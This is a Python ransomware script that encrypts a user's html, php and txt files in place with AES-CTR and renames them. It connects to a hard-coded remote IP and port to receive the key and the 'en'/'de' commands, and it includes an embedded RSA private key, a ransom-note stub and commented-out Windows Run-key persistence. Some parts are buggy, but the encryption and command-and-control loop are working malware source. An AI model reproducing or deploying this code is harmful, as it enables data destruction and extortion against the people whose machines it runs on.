#!/usr/bin/env python3
import base64
import shutil
import socket
import subprocess
import sys
from datetime import time
from Crypto.Util import Counter
from Crypto.Cipher import AES
import os, os.path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


#key = b'\x98\x1c\xfc\xa6|nv\xeff\xeb\xbd\xb5\xd8\xf5\x03\xaf'

class virus:
    def __init__(self):
        #self.becomePresedinatal()
        ###for linux
        #self.msg = os.path.expanduser("~"+"/Desktop/")
        # self.filer= os.path.expanduser("~"+"/Desktop/Myfolder")

        ### for windowns

        #self.file_name = os.path.expanduser("~")
        #self.msg = os.path.expanduser("~"+"\OneDrive\Desktop\\")

        self.fmsg = os.path.expanduser("~")
        self.msg = self.fmsg +"/hossam"
        self.extensions = self.exten()
    def run(self,key):
        for i in self.extensions:
            #print(i)
            try:
                self.enc(key,i)
            except:
                pass
    def runback(self,key):
        for i in self.extensions:
            # print()
            try:
                self.dec(key,i)
            except:
                pass
        #self.newfile()
        #self.myloc = os.path.realpath(__file__)
        # self.explode = self.explode()        ##encrypting itself after finishing the metion


    # def becomePresedinatal(self):
    #     evil_file_location = os.environ["appdata"] + "\\Windower.exe"
    #     if not os.path.exists(evil_file_location):
    #         try:
    #             shutil.copyfile(sys.executable, evil_file_location)             ##coping the path of the file.exe to appdata
    #             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v updater /t REG_SZ /d "' + evil_file_location + "'",shell=True)
    #         except:
    #             pass
    #     else:
    #         try:
    #             self.explode
    #             sys.exit(0)
    #
    #         except:
    #             pass
    # def explode(self):
    #     try:
    #         self.enc(key,self.myloc)
    #     except:
    #         pass
    def enc(self, key, file_name):
        counter = Counter.new(128)
        c = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(str(file_name), 'r+b') as f:
            plaintext = f.read(16)
            while plaintext:
                try:
                    f.seek(-len(plaintext), 1)
                    f.write(c.encrypt(plaintext))
                    plaintext = f.read(16)
                except:
                    pass
            try:
                os.rename(file_name, file_name + ".en")
            except:
                pass
    def dec(self, key, file_name):
        counter = Counter.new(128)
        d = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(file_name, 'r+b') as ef:
            plaintext = ef.read(16)
            while plaintext:
                try:
                    ef.seek(-len(plaintext), 1)
                    ef.write(d.decrypt(plaintext))
                    plaintext = ef.read(16)
                except:
                    pass
            try:
                os.rename(file_name, file_name.strip('.en'))
            except:
                pass

    def exten(self):
        extensions = ['html','php','txt','en']            ##the extensions of the files that will be encrypted
        blank = []
        for d , sd , f in os.walk(self.msg):
            for filename in f:
                full_path = os.path.join(d,filename)
                ex = full_path.split(".")[-1]
                if ex in extensions:
                    blank.append(full_path)
        return blank
    def newfile(self):
        with open(self.msg+"ReadME.txt",'w') as n:
            n.write("Hey Man  don't worry about your data follow the instruction below  ")
            n.close()



#####virus()                    ####delete # before virus to run the ransom

def client():
    port = 16048
    ip = "18.197.239.5"
    keypriv = """-----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAnm1TUs+hy4gLOwfHllDYIHE4nzy+nX99KR3wJkyzg/OFu26W
    e5RVGk0+PmvRlJ+5YG3qpw45K7WW444xRE/hsynm0J8TsfgiUGRoKyvmqAfngNz2
    2mlyjb6cs8UODGuNu9fnsMCjNrROo+gnVAslmYTpnfiJFeen7kbHy0/o4ofx6p0s
    TUkCcRrcXxbXuR0c7mycSA8sE9+ikLXGlec+YAbtjd97ZNkqFkHVVGp+NTLhx6jT
    WY1ig7PMAwrg1F/B8sAkWPzlcJxZqIONc5gyAd5WwEA5uwIsjiwcYfg4ks8NxW97
    wi8y2bDbyD9klQSm1VDporJLBa5VX1hVa4Z2lQIDAQABAoIBAAS3ra0AGMnGPcte
    sm9D7gOdS3nWZbir5K62QQHq88eAl2Fa7Ck25AfZ9/oE3ONHlE4OR9f8oPAvwpP5
    Fnd5x3c9zq00p3H7uQ3ax41Ni9tCDP811TXwwOP+oozp176/7yMCTVhijBmjadoQ
    nicvA8ob/pbhITfhQ4thWS6xLPad2Kia30IyTU26h9ppeQ8EyG0SxYbyZfjnrOS3
    Zri8impK4yq/43+S/YdWgrBZo4nxU0a2mOzNHsvLo1sPqJPHkSoZ79WFv+hyVvai
    GSznmc5BiGgbVUt0CyTuVY19tk1YrgVEH/TLRilUg+jRyZ1cLjUjdwZSxoO79+CS
    SKEP9nsCgYEAuH0OSc3l7nSjTFiEGhGuHSTljLHrrEYakwp5bgGlIe66qBO6imyB
    uXeGUHDdDEn0qMS3Gi8atw2ddH+gX9UymSA+1oP8s21ZzaD2bXh+jz+qwwsq2hAA
    o44LQmarzZbJF+NHrocOqDCtZjGnpQ42tVS1qTD6pi78DITgFNtAeEMCgYEA29Yr
    y5j1m34HuE5JWU0zpZ55Z6Vdjrf5bak48YStynnqi/gSJl2daVyteqzOl0t7dKDW
    Wpj2TBqIDlqNHhglwUxb7QaThVpEIgnniKm7Sfe+m49WYwqG7v9HSioYboTIMQ2f
    ea3hYj4krqx5Y2sFW8hnzqwegtyJRp48idkytEcCgYEAnn3g/orCk/7kIzyQEI1L
    1YHTKvHXE6MORXBkLZuAMAyVkruQMEdTkvAaFZVAccQ/SZXl77qz6rrpoCHctzfD
    RkWrdkLhn4u78KntytIPeCUsIG/BmqDQy7HF/n+R7QczLzB0bn1cnCVlcjwKWARD
    /7gMcJPBYW9P3blxgLlzQ10CgYEAxTwXWPioS1S8umhKuLtiPhK72/jqwrRfLjso
    YtBmWIYfoGr2ZcOSCkjjQHAwfl9zqUTwbKJWQBuBvFcTy09g+Fd5FmTTEE7XWC7I
    s72M0qVbNxhYKk30mBMjM/AmsWmibxhI35PY5hrZMHqAAmmvihR4xl14lnIlG922
    dPsQ2dsCgYBym/IjS1nVrEMXlueBkafacOCPpIC/mNc253LaoQSO93Bfa2vbrmsu
    QnI5nMzlzWxZXf+8yzl9PdgPH2UfS6ZH9DCeq/ahXOWycIOPWTwa3xH5rEfI+5z1
    tgc4/rAJ5APSzSUgZP1d8TvhIJwfY3yv/K+yzqGP+sJmdZnPTev/yg==
    -----END RSA PRIVATE KEY-----                                                                                                                
    """

    cipherp = PKCS1_OAEP.new(keypriv)


    #print(decrypted_msg)
    # #privatekey = privatekey.encode("ascii")
    # #privatekey1 = RSA.importKey(privatekey)
    # #cipher = PKCS1_OAEP.new(privatekey)
    # private_key = privatekey.encode("ascii")
    # pubkey1 = RSA.importKey(private_key)
    # c = PKCS1_OAEP.new(pubkey1)

    # key = b"f\xa3\x91.T/\xeb\x14\xaa\xad\xd5\x13\xed\xf8]\xeb\n?5\x83\xdc\xf7\xb5\xa4\xa4+\xaa\xb6\xf33\t\x0e\x96\x9f9\xf7Em'T\xf4\x7f\xcaPY\x8b\xd0\xd5\xf7b\x80\xe0\x15}\x19\xf6\xd2$\xbb\x90\x1d\xb6\xa8\xf5\xaag\xe9\xf4oz\x0c\xa8M\xfc\x9a\xea\xac\xefK\xe1\x8ch\x95\xbf\xdc\xc0K\x12\xc6I\xd5g!\x0eU\x00?\x92:\xa6\xc6\x1e\xb2h\xce\x9a\r\x87\x87\xf1\xcc\x93\xd4\x1f\x0b\xd2\x94\x1eEXH\xb9\x0eGhu\xebp\xee\x9c\x97b\xa4V\xb0\xcfy\xf9T\xf37yv\x9c\xec|mk\xe4\xc7\xc0y\xae\xc2\xd6%\x87\x02\xaa\xab\xb7?Dl\t\xf1V\x98\xed\xfe\x0e\xf7\n\xf0\xd8B\xe2\xc4X^\xbbUx\xa2\xa5Ux\xc1\xdaa\xea\xc177\xb9\xa2\x95&\xab\x0b\x84\xf0V\xd8\xec\xa6\xfb\xdd;~\x932\x8b\xcd\xb1X\x9f\xff\xb68\xdd\x99\xd5\xaa\x8ar8\x04xfb!\x02\xca^\xd2q\xeb\xf7\xcc\xa8Q\xda\xdb\x06\xd7\xbd\xfc\x958}\xbe\xdc\x88\xc9)"
    # decrypted_key = c.decrypt(key).decode("ascii")
    # print(decrypted_key)
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        #s.send(b"please put the key first : ")
        key1 = s.recv(2048)
        decrypted_key = base64.b16decode(key1)
        print(decrypted_key)
        #decrypted_key = de_key.decrypt(key1).decode("ascii")
        #print(decrypted_key)
        while True:
            command = s.recv(2048)
            command = command.decode("ascii")
            if command =="en":
                s.send(b"starting encryption ...")
                virus().run(decrypted_key)
            if command =="de":
                s.send(b"starting decrypting... ")
                virus().runback(decrypted_key)
            if command == "exit":
                s.close()
                break

    except socket.error as e:
        s.close()
        print("trying to connect again")
        time.sleep(10)
        client()
client()

